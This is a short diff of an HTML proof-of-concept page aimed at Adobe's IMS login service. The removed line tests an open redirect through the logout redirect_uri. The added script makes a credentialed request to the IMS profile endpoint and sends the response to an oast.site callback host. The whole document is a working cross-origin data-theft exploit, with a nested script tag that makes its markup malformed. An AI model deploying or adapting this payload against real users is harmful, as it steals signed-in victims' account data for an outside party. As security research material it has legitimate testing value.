@@ -7,7 +7,17 @@
 </head>
 <body>
   <script>
-    location="https://ims-na1.adobelogin.com/ims/logout/v1?client_id=SunbreakWebUI1&redirect_uri=d75nc62dcva1vumu6m103sjbfdab1xjeh.oast.site"
+    <script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://ims-na1.adobelogin.com/ims/profile/v1',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='https://d7859dqdcva7cca5aojg7wis1azwcxeb5.oast.site/log?key='+this.responseText;
+    };
+</script>
   </script>
 </body>
 </html>
